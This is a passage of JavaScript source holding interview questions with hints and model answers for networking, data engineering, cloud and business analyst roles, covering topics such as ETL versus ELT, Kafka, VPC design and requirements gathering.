      { q:`What is the difference between a hub, switch, and router?`, hint:'Hub: Layer 1 broadcast to all ports. Switch: Layer 2 MAC-based forwarding. Router: Layer 3 IP-based routing between networks. Each operates at a different OSI layer.', answer:`A hub is a Layer 1 device - it repeats every signal it receives to all ports simultaneously. Every device connected to a hub shares the same collision domain. If two devices transmit simultaneously, a collision occurs. Hubs are obsolete in modern networks. A switch is a Layer 2 device - it learns which MAC addresses are connected to which ports and forwards frames only to the correct port. This eliminates collisions and makes full-duplex communication possible. Each port on a switch has its own collision domain. Switches operate within a single broadcast domain (unless VLANs are configured). A router is a Layer 3 device - it routes IP packets between different networks using routing tables. It separates broadcast domains, enforces network boundaries, and connects networks with different address spaces. Modern enterprise equipment often combines these functions: Layer 3 switches perform inter-VLAN routing, and routers have built-in switching capabilities. For network design, the distinction is about which OSI layer the device uses for forwarding decisions.` },
      { q:`How do you secure a network infrastructure against common attacks?`, hint:'Network segmentation, ACLs/firewalls, IDS/IPS, 802.1X port authentication, encrypted management (SSH not Telnet), disable unused services/ports, VPN for remote access.', answer:`Network security is defence in depth at every layer. Segmentation is the foundation: VLANs and firewall zones separate untrusted users, servers, management infrastructure, and IoT devices so a compromise in one segment cannot easily spread. Access control lists enforce what traffic is permitted between segments - I apply least-privilege ACLs: default deny with explicit permit rules. Port security on switches prevents MAC flooding and limits which devices can connect to a port; 802.1X provides authentication before network access is granted. All management access uses encrypted protocols - SSH instead of Telnet, HTTPS instead of HTTP for web management, SNMPv3 instead of v1/v2. I disable all unused switch ports and assign them to an unused VLAN. IDS/IPS monitors traffic for known attack signatures and anomalies. VPN or zero-trust access replaces direct RDP/SSH from the internet. I also implement network monitoring with flow analysis to establish baselines - anomalous traffic volumes or new communication patterns between segments are often the first indicator of a compromise.` },
    ].forEach(addRS);
  } else if (isDataEng) {
    [
      { q:`Explain the difference between ETL and ELT. When would you choose each approach?`, hint:'ETL: transform before loading (traditional warehouse). ELT: load raw then transform in-warehouse (modern cloud DWH). ELT scales better with cloud compute.', answer:`ETL - Extract, Transform, Load - transforms data in a processing layer before loading it into the data warehouse. This was the standard approach when warehouse storage was expensive and compute inside the warehouse was limited. ELT - Extract, Load, Transform - loads raw data into the warehouse first, then transforms it using the warehouse's own compute. Modern cloud warehouses like BigQuery, Snowflake, and Redshift have made ELT the dominant pattern because storage is cheap, warehouse compute scales elastically, and keeping raw data allows re-transformation as business requirements change without re-extracting from source. I choose ETL when data must be masked, filtered, or heavily cleaned before entering storage for compliance or size reasons, or when loading into a legacy system with a rigid schema. I choose ELT for modern cloud-native stacks where dbt-style SQL transformations in the warehouse are faster to develop, easier to version-control, and simpler to debug than custom transformation code running in an intermediary layer.` },
      { q:`How do you design a robust data pipeline? What failure handling mechanisms do you include?`, hint:'Idempotency, exactly-once semantics, dead-letter queues, checkpointing, alerting on SLA breach, data quality gates, backfill capability.', answer:`A robust pipeline handles failure gracefully rather than requiring manual intervention. The first principle is idempotency: re-running a pipeline should produce the same result as running it once - no duplicate records, no partial states. I achieve this through upserts rather than inserts, and by partitioning data so only the affected partition is reprocessed. Checkpointing saves progress so a restart does not re-process everything from the beginning. Dead-letter queues capture records that fail processing for manual review rather than silently dropping them. Data quality gates validate completeness, freshness, and schema conformity before downstream consumers receive the data - a pipeline that delivers bad data on time is worse than a delayed pipeline. I instrument with metrics: records processed per second, lag from source, error rates, and pipeline duration. SLA alerting notifies the team when a pipeline will miss its delivery window with enough lead time to investigate. I also ensure every pipeline supports manual backfill - the ability to reprocess historical data for a date range is essential when requirements change or bugs are discovered.` },
      { q:`What is Apache Spark and how does it differ from traditional MapReduce?`, hint:'Spark: in-memory distributed processing, DAG execution engine, 10-100x faster than MapReduce. Supports streaming, ML, SQL via unified API.', answer:`Apache Spark is a distributed data processing framework that executes processing in memory rather than reading and writing to HDFS at each step as MapReduce did. MapReduce has a rigid two-stage map-then-reduce model with intermediate results written to disk between stages - this makes it slow for iterative algorithms like machine learning. Spark uses a DAG - Directed Acyclic Graph - execution engine that chains operations lazily, optimises the execution plan, and keeps intermediate data in memory. This makes Spark 10-100x faster than MapReduce for workloads that fit in memory. Spark provides a unified API for batch processing (Spark SQL, DataFrames), streaming (Structured Streaming), machine learning (MLlib), and graph processing (GraphX). In practice I use PySpark or Scala Spark for large-scale batch transformations, and Structured Streaming for near-real-time processing. Key concepts I use daily: partitioning and repartition for parallelism, broadcast joins for small tables, caching for iterative transformations, and Delta Lake for ACID transactions on Spark tables.` },
      { q:`Explain Apache Kafka. How would you design a streaming data pipeline using it?`, hint:'Kafka: distributed commit log. Topics, partitions, consumer groups, offsets. Producers write, consumers read at their own pace. Retention-based replay.', answer:`Kafka is a distributed, high-throughput, durable commit log. Producers write messages to topics; topics are divided into partitions for parallelism; consumers read messages at their own pace using offset tracking. Consumer groups allow multiple consumers to divide partitions among themselves for horizontal scaling. Messages are retained for a configurable period regardless of whether they have been consumed, enabling replay. For a streaming pipeline, my design would be: producers write raw events (user clickstream, transactions) to a topic partitioned by user ID for ordering guarantees per user. A Kafka Streams or Faust application consumes the raw events topic, enriches them (joining with user profile data from a reference store), and publishes to a processed events topic. A Spark Structured Streaming job consumes the processed topic for windowed aggregations and writes to the data warehouse. A separate consumer writes to Elasticsearch for real-time dashboards. The decoupled producer-consumer architecture means any consumer can be modified, redeployed, or added without affecting producers or other consumers.` },
      { q:`What are Slowly Changing Dimensions (SCDs) and how do you handle them in a data warehouse?`, hint:'SCD Type 1: overwrite. Type 2: new row with effective dates (full history). Type 3: add column for old value. Most common: Type 2 for auditable history.', answer:`Slowly Changing Dimensions address how dimension data changes over time in a data warehouse. A customer changes their address or a product changes its price - how do you handle the historical records? SCD Type 1 simply overwrites the old value - there is no history. Use this when you do not care about what the old value was: correcting a typo in a name. SCD Type 2 is the most common - it creates a new row for each change with effective_start_date and effective_end_date columns, and an is_current flag. This preserves complete history: you can see what address a customer had at any point in time and report on historical data correctly. SCD Type 3 adds columns for the previous value - previous_address, current_address - which captures one generation of history but is inflexible if you need full history. In modern cloud warehouses I prefer Type 2 implemented via dbt's snapshot feature, which handles the row insertion and date management automatically given a defined unique key and change detection strategy.` },
      { q:`How do you ensure data quality in a production pipeline?`, hint:'Schema validation, completeness checks, range checks, freshness checks, referential integrity, anomaly detection. dbt tests, Great Expectations, Monte Carlo.', answer:`Data quality is a contract between the pipeline and its consumers. I implement quality at three levels. First, schema validation at ingestion: reject or quarantine records that do not conform to the expected schema before they enter the warehouse. Second, content validation after transformation: dbt's built-in tests cover non-null constraints, uniqueness, and referential integrity. For more sophisticated checks I use Great Expectations: testing that a column's values are within an expected range, that the count of records arriving today is within 20% of yesterday's count (freshness and completeness monitoring), that null rates for critical fields have not increased. Third, anomaly detection: Monte Carlo and similar data observability platforms monitor for statistical anomalies - unusual volume drops, distribution shifts, schema changes - and alert before downstream consumers notice. I also build data quality metrics into dashboards visible to the business: "data freshness: last updated 4 hours ago" creates accountability. Any pipeline with no quality checks is not a production pipeline.` },
      { q:`What is data lineage and why does it matter?`, hint:'Tracks the origin, movement, transformation, and consumption of data. Critical for debugging, compliance (GDPR), impact analysis, and trust.', answer:`Data lineage documents where data comes from, how it has been transformed at each step, and where it is consumed. It answers: if this source table changes, what downstream reports are affected? If a compliance request asks which reports use a customer's personal data, where is it? When a dashboard shows an unexpected number, which transformation step introduced the error? Without lineage, data engineering is archaeology - you trace backwards through code and documentation hoping someone left breadcrumbs. Modern tools make lineage automatic: dbt generates column-level lineage as a byproduct of building the transformation graph; Airflow tracks pipeline dependencies; OpenLineage and Marquez capture lineage at runtime across tools. For GDPR and CCPA compliance, lineage is often legally required - you must be able to demonstrate where personal data flows and implement data deletion across all systems where it lives. I treat lineage as infrastructure, not documentation: it should be generated automatically and queryable, not maintained manually in a spreadsheet.` },
      { q:`How do you handle late-arriving data in a streaming pipeline?`, hint:'Watermarks define how long to wait for late data. Late data after watermark is dropped or sent to dead letter. Window functions with allowed lateness.', answer:`Late-arriving data is inevitable in distributed systems - a mobile device goes offline and sends events when it reconnects, a service retries failed messages after a delay. How to handle it depends on the latency tolerance of the use case. For windowed aggregations (e.g., hourly order counts), I use watermarks: a watermark defines the maximum expected lateness. The system processes data within the window even after the window closes, up to the watermark threshold. For Spark Structured Streaming, I set a withWatermark on the event time column - records arriving after the watermark are either silently dropped or routed to a late-data handler topic for separate processing. For batch pipelines that run on a schedule, I include a lookback window: rather than only processing records created in the last hour, I include records with event times in the last two hours to capture late arrivals from the previous window. The right watermark is determined empirically from the P99 latency distribution of your data sources, not arbitrary.` },
      { q:`What is the difference between a star schema and a snowflake schema?`, hint:'Star: fact table + denormalized dimension tables. Snowflake: dimensions normalized into sub-dimensions. Star: simpler queries, more storage. Snowflake: less redundancy, more joins.', answer:`Both are dimensional modelling approaches for data warehouses. A star schema has a central fact table containing metrics (sales amount, order quantity) and foreign keys, surrounded by denormalized dimension tables (product, customer, date) that contain all descriptive attributes in a single table. Queries are simple with few joins. A snowflake schema normalizes the dimension tables - a product dimension table references a category table which references a department table, reducing data redundancy but requiring more joins for typical queries. In practice, I almost always prefer the star schema for analytical workloads. Analysts write SQL against these schemas, and fewer joins produce simpler, more performant queries in column-oriented warehouses. The storage savings from snowflaking are negligible in modern cloud warehouses. Snowflaking makes sense when a dimension is very large, heavily updated, or shared across multiple fact tables and deduplication matters for maintenance. The Kimball methodology recommends star schemas as the default, and I agree with that recommendation based on real-world usability.` },
      { q:`How do you manage data pipeline orchestration? Compare Airflow, Prefect, and dbt.`, hint:'Airflow: DAG-based, mature, complex setup. Prefect: modern Python-first, easier local dev. dbt: SQL transformations only, not general orchestration.', answer:`These tools serve related but different purposes. Apache Airflow is the industry standard for general-purpose workflow orchestration - it defines pipelines as Python DAGs, has a rich UI for monitoring, supports thousands of operators for connecting to different systems, and has a massive ecosystem. Its complexity is real: setting up Airflow, managing workers, and debugging DAG issues requires significant operational investment. Prefect is a modern alternative that addresses Airflow's pain points: simpler local development, better error handling, and a cleaner Python API. It separates the orchestration logic from the execution environment. dbt is not a general orchestrator - it is specifically for SQL-based transformations in a data warehouse. A dbt project defines how raw data is transformed through a series of SQL models with dependency resolution, testing, and documentation built in. In practice, many teams use Airflow or Prefect to orchestrate the overall data flow (extract, load, trigger dbt, export) while using dbt for all the in-warehouse transformation logic.` },
      { q:`Explain partitioning in distributed data storage. How does it affect query performance?`, hint:'Horizontal partitioning divides rows by a key (date, region). Partition pruning lets queries skip irrelevant partitions. Poor partition key choice causes hotspots.', answer:`Partitioning divides a large dataset into smaller, independent segments based on a partition key. In a data warehouse context, date partitioning is the most common - a table is divided into daily or monthly partitions. When a query includes a filter on the partition column (WHERE event_date = '2024-01-01'), the query engine applies partition pruning: it reads only the relevant partition files rather than scanning the entire table. For a table with three years of daily data, a query filtered to one week reads about 0.6% of the data instead of 100% - a transformative performance difference. Partition key selection requires care. A high-cardinality column like user_id spread across many partitions causes partition explosion - too many small files, which degrades performance for full scans. An event_type column with only five values causes all data to concentrate in five large partitions, providing no pruning benefit. For most analytical workloads, date is the best primary partition key because most queries have a time filter. Clustering or sorting within partitions by a second column like region or product category further improves selective queries.` },
    ].forEach(addRS);
  } else if (isCloud) {
    [
      { q:`Explain the differences between IaaS, PaaS, and SaaS with real examples of each.`, hint:'IaaS: raw compute/storage (EC2, Azure VMs). PaaS: managed runtime (Heroku, App Engine, RDS). SaaS: full application (Salesforce, Gmail). Responsibility shifts with each tier.', answer:`IaaS - Infrastructure as a Service - provides raw compute, storage, and networking that you manage as virtual hardware. You provision EC2 instances, attach EBS volumes, and configure VPCs. You are responsible for the OS, runtime, middleware, and application - the cloud provider manages the physical hardware. PaaS - Platform as a Service - abstracts the infrastructure layer. You deploy code and the platform handles OS patching, scaling, and runtime management. Heroku, Google App Engine, AWS Elastic Beanstalk, and RDS are PaaS. You focus on the application code; the platform manages everything below it. SaaS - Software as a Service - delivers a complete, ready-to-use application over the internet. Salesforce, Slack, Gmail. You configure and use it; the provider manages everything including the application code itself. The shared responsibility model shifts accordingly: IaaS requires the most operational work but gives maximum control; SaaS requires the least operational work but gives the least flexibility. Most cloud architectures blend all three: a PaaS database (RDS), IaaS compute (EC2) for workloads that need OS-level control, and SaaS tools for productivity and monitoring.` },
      { q:`How do you design a multi-region, highly available architecture on a cloud platform?`, hint:'Active-active vs active-passive. Route53/Traffic Manager for DNS failover. Cross-region replication for databases. CDN for static assets. RTO/RPO define required investment.', answer:`Multi-region HA design starts with defining RTO - Recovery Time Objective, how long the service can be down - and RPO - Recovery Point Objective, how much data loss is acceptable. These numbers determine the investment required. For an active-active architecture across two regions, traffic is load-balanced across both regions simultaneously using DNS-level routing (Route53 with latency-based or failover routing). Databases use cross-region read replicas with automated failover, or globally distributed databases like Aurora Global or CockroachDB. State that cannot be replicated fast enough (like shopping carts) is handled with globally distributed stores like DynamoDB Global Tables. Static assets are served from a CDN close to users. Active-active requires applications to handle the possibility that a request is served from a region without the freshest data - eventual consistency must be acceptable. For active-passive, one region is primary; the passive region receives replication but serves no traffic until failover. Simpler to manage but with higher RTO. Regular DR drills - actually failing over to the passive region - are non-negotiable.` },
      { q:`What is serverless computing and when should you use or avoid it?`, hint:'No server management, event-driven, pay-per-invocation, automatic scaling. Limitations: cold starts, 15-minute timeout (Lambda), vendor lock-in, hard to debug locally.', answer:`Serverless means running code without managing servers - the cloud provider handles capacity planning, scaling, and availability. AWS Lambda, Google Cloud Functions, and Azure Functions execute code in response to events and scale from zero to thousands of concurrent executions automatically. You pay only for actual execution time, not idle capacity. Use serverless when: the workload is event-driven with variable or spiky traffic (API backends, file processing triggers, scheduled tasks); you want to eliminate operational overhead for small services; the workload duration is under 15 minutes. Avoid serverless when: you have predictable, sustained high traffic - the per-invocation cost exceeds reserved instance cost at scale. Cold start latency is unacceptable for the use case - a Lambda function that has not been invoked recently takes 100-500ms to initialise, which matters for real-time APIs. The function runtime requirements exceed Lambda limits (memory, execution time). Complex local development or debugging workflows are required - serverless is notoriously harder to test locally than containerised applications. I use serverless for the long tail of event-driven tasks and containers or managed services for consistently-loaded production APIs.` },
      { q:`How do you approach cloud cost optimisation? Give concrete techniques.`, hint:'Right-sizing instances, Reserved/Savings Plans for predictable workloads, Spot for fault-tolerant, S3 lifecycle policies, delete unused resources, cost allocation tags.', answer:`Cloud cost optimisation requires visibility first. I tag every resource with environment, team, and service labels, then use AWS Cost Explorer or Cloud Billing dashboards to understand spending by service and team. The biggest wins are usually right-sizing and commitment discounts. Right-sizing: I analyse utilisation metrics - CPU, memory, and network - and downsize instances running at under 20% utilisation. Many workloads are deployed on oversized instances "just in case." Commitment discounts: Reserved Instances or Savings Plans offer 30-70% discounts for committing to one or three years. For a production database that runs 24/7, this is an obvious win. Spot instances for fault-tolerant batch workloads or CI runners reduce compute costs by 70-90%. Data transfer costs are often overlooked: inter-region and internet-bound transfer are expensive; routing traffic through a VPN or Direct Connect, using S3 gateway endpoints, and keeping data in the same region as compute reduces this. Storage lifecycle policies automatically move infrequently accessed S3 objects to cheaper tiers (Glacier) after a configurable time. Finally, I schedule development environments to shut down outside business hours - a surprising portion of cloud bills comes from dev/test instances running overnight.` },
      { q:`Explain VPC design - what components do you use and how do you structure them for security?`, hint:'VPC with public/private subnets across AZs. Internet Gateway for public. NAT Gateway for private outbound. Security Groups (stateful, instance). NACLs (stateless, subnet).', answer:`A well-designed VPC follows the principle of least-exposure. I create separate public and private subnet tiers across multiple Availability Zones for both high availability and security separation. Public subnets contain only resources that must accept inbound internet traffic - load balancers and NAT Gateways. An Internet Gateway attached to the VPC and routes in the public subnet route table allow this inbound access. Application servers, databases, and internal services live in private subnets with no direct internet route. A NAT Gateway in the public subnet allows private resources to make outbound internet calls (for package updates, external API calls) without being directly reachable from the internet. Security Groups provide stateful firewall rules at the instance level - I apply them by role: web tier, app tier, database tier, management. Rules permit only the minimum necessary: the app tier can reach only the database port; the database tier rejects all traffic except from the app tier security group. NACLs provide a stateless subnet-level additional layer. VPC Flow Logs capture all traffic metadata for security monitoring and forensics.` },
      { q:`What is cloud-native architecture and what are its core principles?`, hint:'Microservices, containers, immutable infrastructure, declarative config, CI/CD, designed-for-failure. Contrast with monolith + lift-and-shift.', answer:`Cloud-native means designing applications to fully exploit cloud capabilities rather than simply running traditional applications in the cloud. The core principles are: microservices decompose a system into independently deployable services, each owning its data and scaling independently. Containers package each service with its dependencies, making deployment consistent across environments. Immutable infrastructure means servers are never modified in-place - when a change is needed, a new image is built and deployed, eliminating configuration drift. Declarative configuration in code (Kubernetes manifests, Terraform, Helm) means infrastructure state is version-controlled and reproducible. Design for failure means assuming any component can fail and building automatic recovery: health checks, circuit breakers, retries with backoff, and graceful degradation. Dynamic discovery and configuration allow services to find each other and adapt to the environment without hardcoded addresses. CI/CD delivers changes to production frequently and safely. The practical benefit is independent scalability, faster deployment, and resilience - but the operational complexity is real and cloud-native is not always the right fit for small teams or simple applications.` },
      { q:`How do you implement Disaster Recovery in the cloud? Explain RTO, RPO, and the different DR strategies.`, hint:'RTO: recovery time. RPO: data loss tolerance. Strategies: backup-restore (cheapest, slowest), pilot light, warm standby, multi-site active-active (most expensive, fastest).', answer:`Disaster recovery planning starts with two metrics: RTO - Recovery Time Objective, the maximum acceptable downtime - and RPO - Recovery Point Objective, the maximum acceptable data loss. These are business decisions driven by revenue impact per hour of downtime and compliance requirements. The DR strategy is chosen based on acceptable RTO/RPO and cost. Backup and Restore is the cheapest: data is backed up to S3; recovery means restoring from backup in a new environment. RTO is hours; RPO is hours to days depending on backup frequency. Pilot Light maintains a minimal version of critical systems always running - databases replicated, critical infrastructure provisioned. Recovery scales up the remaining components. RTO is 1-4 hours. Warm Standby maintains a scaled-down but fully functional copy of the production environment. Recovery scales it to full production capacity. RTO is minutes to an hour. Multi-site Active-Active (already covered in HA discussion) has near-zero RTO and RPO but costs roughly double. I recommend conducting documented DR drills quarterly - an untested DR plan is a guess, not a plan.` },
      { q:`How do you manage configuration and secrets in cloud infrastructure?`, hint:'Environment-specific config in Parameter Store/SSM. Secrets in Secrets Manager/Vault with automatic rotation. Never in code or plain-text environment variables.', answer:`Configuration and secrets are distinct concerns with different security requirements. Non-sensitive configuration - feature flags, connection strings without credentials, API endpoints - I store in AWS Systems Manager Parameter Store or equivalent, organised by /environment/service/parameter hierarchy. This makes environment-specific configuration explicit, version-controlled, and accessible to services via IAM without code changes. Secrets - database passwords, API keys, OAuth credentials - I store in AWS Secrets Manager or HashiCorp Vault. Both provide automatic rotation, access auditing, and fine-grained IAM-based access control. I enable automatic rotation so database passwords change regularly without application intervention. Applications retrieve secrets at startup or on-demand from the secrets manager rather than reading them from environment variables or files. For Kubernetes, I use the External Secrets Operator to sync secrets from the secrets manager into Kubernetes Secret objects automatically, rather than manually creating secrets. The rule is absolute: no secrets in code, in Git history, in plaintext environment variables in container definitions, or in CI/CD logs. Regular audits with tools like GitLeaks scan for accidental secret exposure.` },
      { q:`How do you implement logging, monitoring, and observability in a cloud environment?`, hint:'Three pillars: logs (CloudWatch/ELK), metrics (CloudWatch/Prometheus), traces (X-Ray/Jaeger). Dashboards, alerting on SLOs, not just raw metrics.', answer:`I build observability around the three pillars: logs, metrics, and traces. For logs, I ensure all services emit structured JSON logs rather than unstructured strings - structured logs are queryable. In AWS I send logs to CloudWatch Logs and use Log Insights for querying; for large volumes I stream to OpenSearch or Splunk. For metrics, CloudWatch metrics cover AWS service health automatically; application-level metrics require instrumentation using Prometheus or CloudWatch custom metrics. I instrument the RED method for every service: Request rate, Error rate, and Duration. For tracing, AWS X-Ray or OpenTelemetry provides distributed tracing across microservices - when a request touches five services, a trace shows where time was spent and where errors originated. Dashboards surface the SLOs I care about: availability, latency P95/P99, and error rate. Alerts fire on SLO violation, not on arbitrary raw metric thresholds like CPU > 80% - CPU spikes are symptoms, not the problem. PagerDuty or OpsGenie handle on-call routing. I review alert noise regularly and remove or adjust alerts that trigger frequently without actionable response.` },
      { q:`Explain Infrastructure as Code. Compare Terraform, CloudFormation, and CDK.`, hint:'IaC: declarative definition of infrastructure in code. Terraform: multi-cloud, HCL, state file. CFN: AWS-native, YAML/JSON. CDK: imperative code that generates CFN.', answer:`Infrastructure as Code means defining infrastructure in version-controlled code files that can be reviewed, tested, and applied repeatedly to produce consistent environments. Drift - the difference between declared and actual state - is detected and corrected on every apply. Terraform uses HCL (HashiCorp Configuration Language), maintains a state file that tracks what it has created, and works across all major cloud providers. Its multi-cloud support and large module ecosystem make it the most widely used IaC tool. The state file is critical to manage safely - I always store it remotely (S3 + DynamoDB for locking) and never modify it manually. CloudFormation is AWS's native IaC service - deep integration with IAM, no separate state management since AWS maintains state internally. It is YAML/JSON heavy and verbose. CDK - Cloud Development Kit - lets you define CloudFormation stacks using TypeScript, Python, Java, or Go, which generates CloudFormation under the hood. CDK is my preference for AWS-only projects because you get the safety of CloudFormation with the expressiveness of a real programming language - loops, conditionals, abstractions, and unit tests. For multi-cloud, Terraform is the clear choice.` },
    ].forEach(addRS);
  } else if (isBA) {
    [
      { q:`How do you elicit and document requirements from stakeholders who have difficulty articulating what they want?`, hint:'Workshops, use cases, prototypes, observation (shadowing), "5 Whys", context diagrams. Translate vague asks into structured requirements.', answer:`The hardest part of requirements gathering is that stakeholders often know their pain but not the solution they need. I use several techniques depending on the situation. Facilitated workshops with cross-functional stakeholders surface conflicting assumptions and build shared understanding quickly. When stakeholders struggle to articulate requirements verbally, I use low-fidelity prototypes or existing system screenshots as prompts - people are much better at reacting to something concrete than describing something in the abstract. Shadowing - observing users in their actual work environment - reveals requirements they have stopped noticing because they have workarounds so ingrained they no longer register them as problems. I use the "5 Whys" technique when stakeholders present a solution rather than a problem ("we need a new report button") - asking why repeatedly usually surfaces the underlying need, which often has a better solution than the one initially proposed. I document requirements as user stories with acceptance criteria and use case narratives, then review them with stakeholders to confirm understanding before passing to development.` },
      { q:`What is the difference between functional and non-functional requirements? Give examples of each.`, hint:'Functional: what the system does (user can reset password). Non-functional: how the system performs (response < 2s, 99.9% uptime, GDPR compliant).', answer:`Functional requirements describe what the system does - specific behaviours, functions, and features. "A user can reset their password by receiving a time-limited email link" is a functional requirement. It describes a concrete capability the system must provide. Non-functional requirements describe how the system performs its functions - qualities and constraints rather than capabilities. "The password reset email must be sent within 5 seconds" is a performance non-functional requirement. "All user data must be encrypted at rest and in transit" is a security requirement. "The system must be available 99.9% of the time" is an availability requirement. "The interface must comply with WCAG 2.1 AA accessibility standards" is a regulatory requirement. Non-functional requirements are often where systems fail in production despite passing functional tests - a system that resets passwords correctly but takes 30 seconds is functionally correct but practically unusable. I capture non-functional requirements explicitly and include them in acceptance criteria, because they are frequently treated as implied until they become a complaint.` },
      { q:`How do you handle conflicting requirements from different stakeholders?`, hint:'Identify the conflict explicitly, understand each stakeholder\'s underlying need, escalate to the authority who can resolve, document the decision and rationale.', answer:`Conflicting requirements usually stem from different stakeholders having different priorities, different mental models of the problem, or incomplete information. My first step is to make the conflict explicit - surface it in a meeting with both stakeholders rather than trying to resolve it in separate conversations, where each party thinks they have agreement. I then separate their stated positions from their underlying needs using interest-based facilitation: what business outcome is each stakeholder actually trying to achieve? Often the conflict dissolves when the underlying needs are examined - they want the same outcome but proposed different solutions. When a genuine conflict remains, I document both requirements, the conflict, and the decision criteria, and escalate to the authority level that can resolve it - a product owner, steering committee, or sponsor. I never silently choose one requirement over another without an explicit decision. The resolution and its rationale are documented, because someone will ask why a requirement was dropped six months later.` },
      { q:`What is a Business Process Model and what tools do you use to create one?`, hint:'BPM shows the sequence of activities to achieve a business outcome. BPMN notation: events, tasks, gateways, swimlanes. Tools: Visio, Lucidchart, Bizagi.', answer:`A Business Process Model documents the sequence of activities, decision points, and roles involved in completing a business process. It makes implicit process knowledge explicit and visible, which is essential for identifying inefficiencies, redesigning processes, and communicating requirements to development teams. I use BPMN - Business Process Model and Notation - as the standard because it has precise semantics that support unambiguous process definition: events (start, intermediate, end), tasks (manual, automated, user), gateways (exclusive, parallel, inclusive), and pools and swimlanes for role/system boundaries. For process discovery, I run current-state process mapping workshops, producing an As-Is process model that captures how things actually work rather than how the procedure document says they should work. The gap between these is usually revealing. I then produce a To-Be model showing the improved or automated process, which forms the basis for functional requirements. I use Lucidchart or Miro for collaborative modelling and Bizagi Modeler for more formal BPMN documentation.` },
      { q:`How do you prioritise a backlog when all requirements are "urgent" and resources are limited?`, hint:'RICE (Reach Ã— Impact Ã— Confidence Ã· Effort), MoSCoW (Must/Should/Could/Won\'t), value vs effort matrix. Align with business strategy, data over opinion.', answer:`When every requirement is "urgent", that means prioritisation has not happened yet - it has just been deferred. I use a structured framework to make the trade-offs visible and data-driven. RICE scoring - Reach Ã— Impact Ã— Confidence Ã· Effort - assigns a numeric priority to each item. Reach: how many users or transactions does this affect? Impact: how much does it improve the outcome? Confidence: how sure are we of the estimates? Effort: how much work does it take? Items with high reach, high impact, and low effort float to the top. For a simpler framing, I use MoSCoW: Must-have (project fails without it), Should-have (important but can be worked around), Could-have (nice but low priority), and Won't-have this iteration. I facilitate a prioritisation workshop where stakeholders score requirements independently before comparing, which surfaces hidden disagreements. I also align priorities explicitly with strategic objectives: if the business goal is customer retention, requirements that directly improve retention score higher than those that do not, regardless of who requested them.` },
      { q:`What is User Acceptance Testing (UAT) and how do you manage it effectively?`, hint:'UAT validates the delivered system meets business requirements. Define test scenarios from requirements, prepare test data, involve business users, track defects, sign-off criteria.', answer:`UAT validates that the delivered system actually meets the business requirements it was built for, in conditions that simulate real-world use. It is the final verification before go-live and is performed by business users or their representatives - not developers or QA. My UAT approach starts with preparation well before the sprint ends. I build UAT test scenarios from the acceptance criteria defined during requirements - each acceptance criterion becomes a test scenario with preconditions, steps, and expected outcomes. I work with the business to prepare realistic test data rather than synthetic data, because real-world data edge cases are always more diverse than developers anticipate. During UAT, I facilitate the sessions, capture defects consistently with business-readable descriptions and severity, and maintain a clear log of what has been tested and what is outstanding. I define go-live criteria explicitly at the start - what percentage of scenarios must pass, which defect severities must be resolved - so the sign-off decision is objective rather than negotiated. I also ensure business users document what they test, which creates an audit trail for compliance purposes.` },
      { q:`Explain use cases versus user stories. When do you use each?`, hint:'Use case: detailed step-by-step interaction (actors, preconditions, main flow, alternate flows). User story: lightweight intent + acceptance criteria. Stories for agile sprints, use cases for complex flows.', answer:`Use cases and user stories capture requirements at different levels of detail and suit different working styles. A use case describes a complete interaction between an actor (user or system) and the system, including preconditions, the main success scenario step by step, and all alternate and exception flows. Use cases are verbose but comprehensive - they capture what happens when things go wrong, which user stories often skip. They are valuable for complex business processes with many branches, compliance documentation, and system interfaces. User stories capture requirements in a lightweight format: "As a [user], I want [capability] so that [benefit]," with acceptance criteria that define when the story is complete. They are fast to write, easy to prioritise in a backlog, and fit naturally into agile sprint planning. I use user stories as the default in agile teams and reach for use cases when: a process has significant complexity and multiple failure paths; compliance requires formal documentation; the development team is offshore and needs unambiguous specifications; or the story's acceptance criteria alone are insufficient to prevent misinterpretation.` },
      { q:`How do you conduct a gap analysis for a new system implementation?`, hint:'Document current state (As-Is), define desired future state (To-Be), identify gaps, classify gaps by type (process/system/data/people), prioritise closure actions.', answer:`A gap analysis identifies the distance between where the organisation is and where it needs to be, which defines the scope of change required. I follow a structured sequence. Current-state assessment: document the existing processes, systems, data flows, and capabilities through stakeholder interviews, system audits, and process mapping. This produces the As-Is picture. Future-state definition: clarify the desired capabilities and outcomes, whether from business requirements, a target operating model, or regulatory requirements. This produces the To-Be picture. Gap identification: compare As-Is to To-Be systematically - what processes do not exist or are insufficient, what system capabilities are missing, what data is unavailable or poor quality, what skills does the team lack? Gap classification: I categorise gaps by type (process, system, data, people) and impact, because different gaps require different interventions. Process gaps may require redesign; system gaps require development or procurement; data gaps may require new collection or cleanup; people gaps require training. Gap prioritisation: not all gaps must be closed before go-live. I create a phased closure plan aligned to business priorities.` },
      { q:`What tools and techniques do you use for requirements documentation and traceability?`, hint:'Requirements traceability matrix (RTM), Jira/Azure DevOps for user stories, Confluence for documentation, BPMN for process models. Traceability links req -> test -> implementation.', answer:`Requirements traceability means being able to trace every requirement from its source through design, implementation, and testing - and in the other direction, trace every implemented feature back to a business requirement. Without traceability, you cannot answer: "is this feature required?" or "if I change this requirement, what tests need updating?" I maintain a Requirements Traceability Matrix - a document or spreadsheet that maps each requirement to the business objective it serves, the design artefacts that address it, the test cases that verify it, and the implementation that delivers it. For agile teams, user stories in Jira or Azure DevOps with explicit links to test cases in the test management tool (Zephyr, TestRail) provide this traceability with less overhead. I document complex requirements in Confluence with decision logs - the why behind requirements decisions - because the reason a requirement exists matters as much as the requirement itself when it needs to change later. For regulated industries, formal RTM is often a compliance requirement for audit evidence.` },
      { q:`How do you validate that a delivered solution actually solves the business problem?`, hint:'Success metrics defined before build (not after), baseline measurement, post-launch measurement, business outcome vs feature delivery. UAT is not the same as business value validation.', answer:`A solution that passes UAT and meets its functional specification may still fail to solve the business problem - because the requirements were wrong, or because the problem was not understood deeply enough. Business value validation requires defining success metrics before the solution is built, not after. I work with stakeholders to answer: what would we see if this problem is solved? More specifically: what measurable outcome changes? Reduced support ticket volume, faster order processing time, higher conversion rate, reduced manual data entry hours per week. These baselines must be measured before the solution launches and again at 30, 60, and 90 days after. This is different from testing that the feature works. The risk of skipping this step is significant: teams celebrate delivery of a solution while the original problem persists because the real root cause was elsewhere. I treat business value validation as a post-implementation review requirement, document the comparison explicitly, and if the expected improvement is not occurring, investigate whether the root cause analysis was correct before concluding the solution failed.` },
    ].forEach(addRS);
  } else if (isSWE) {
    [
